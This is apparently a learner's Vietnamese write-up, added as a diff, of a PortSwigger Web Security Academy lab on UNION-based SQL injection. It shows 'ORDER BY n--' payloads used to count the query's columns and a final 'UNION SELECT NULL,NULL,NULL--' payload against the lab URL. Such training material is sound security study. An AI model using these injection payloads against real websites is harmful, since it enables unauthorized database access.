@@ -1,0 +1,28 @@
+Đây là bài luyện tập SQL Injection
+
+Mục đích của bài luyện tập là tấn công tiêm nhiễm SQL UNION.
+Để tấn công tiêm nhiêm SQL UNION, bài luyện tập hướng dẫn attacker cách xác định số lượng cột trả về khi gọi SQL SELECT query.
+
+Thật vậy, khi lựa chọn category để xem sản phẩm URL sẽ có dạng:
+https://0abd007e04125483c1d30e24006100c0.web-security-academy.net/filter?category=Gifts
+
+URL trên là đang cho ta kết quả xem các sản phẩm có category là Gifts, phỏng đoán câu lệnh query sẽ như sau
+
+SQL Query: SELECT các trường FROM product WHERE category = 'Gifts'
+
+Ở đây các trường là thứ chúng ta chưa biết là gì và số lượng là bao nhiêu, ví dụ có thể là : ID, Name, Money,....
+
+Để dò số lượng bao nhiêu trường ta truyền vào URL payload ' ORDER BY i-- với i tăng dần từ 1 cho đến khi trang web trả về lỗi hoặc không còn trả về kết quả
+Khi đó URL sẽ có dạng:
+https://0abd007e04125483c1d30e24006100c0.web-security-academy.net/filter?category=Gifts' ORDER BY 1--
+https://0abd007e04125483c1d30e24006100c0.web-security-academy.net/filter?category=Gifts' ORDER BY 2--
+
+SQL Query:  SELECT các trường FROM product WHERE category = 'Gifts' ORDER BY 1--'
+            SELECT các trường FROM product WHERE category = 'Gifts' ORDER BY 2--'
+
+Kết quả: tôi dò được có 3 trường được gọi trong câu lệnh SQL Query này.
+
+Để hoàn thành bạn phải gửi 1 query SELECT UNION NULL với số trường là 3 để hoàn thành bài lab:
+
+https://0abd007e04125483c1d30e24006100c0.web-security-academy.net/filter?category=Gifts' UNION SELECT NULL,NULL,NULL--
+
